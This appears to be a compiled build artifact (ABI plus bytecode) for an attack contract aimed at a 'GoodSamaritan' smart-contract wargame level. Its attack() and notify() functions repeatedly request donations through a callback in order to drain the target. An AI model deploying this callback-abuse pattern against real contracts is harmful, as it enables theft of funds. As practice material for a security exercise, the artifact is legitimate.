{"abi":[{"type":"constructor","inputs":[{"name":"goodSamaritanInstance","type":"address","internalType":"address"},{"name":"coinAddress","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"coin","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract Coin"}],"stateMutability":"view"},{"type":"function","name":"instance","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"notify","inputs":[{"name":"amount","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b5060405161024b38038061024b833981016040819052602b916074565b5f80546001600160a01b039384166001600160a01b0319918216179091556001805492909316911617905560a0565b80516001600160a01b0381168114606f575f5ffd5b919050565b5f5f604083850312156084575f5ffd5b608b83605a565b9150609760208401605a565b90509250929050565b61019e806100ad5f395ff3fe608060405234801561000f575f5ffd5b506004361061004a575f3560e01c8063022ec0951461004e57806311df99951461007c57806398d078b41461008f5780639e5faafc146100a4575b5f5ffd5b5f54610060906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b600154610060906001600160a01b031681565b6100a261009d36600461012b565b6100ac565b005b6100a26100b7565b6100b46100b7565b50565b5f5f9054906101000a90046001600160a01b03166001600160a01b031663251436386040518163ffffffff1660e01b81526004016020604051808303815f875af1158015610107573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100b49190610142565b5f6020828403121561013b575f5ffd5b5035919050565b5f60208284031215610152575f5ffd5b81518015158114610161575f5ffd5b939250505056fea2646970667358221220699dce6e73514b190d509c163611cd4c03a5dbbfb19d8c80f5aa2120c873958f64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","coin()":"11df9995","instance()":"022ec095","notify(uint256)":"98d078b4"},"id":0}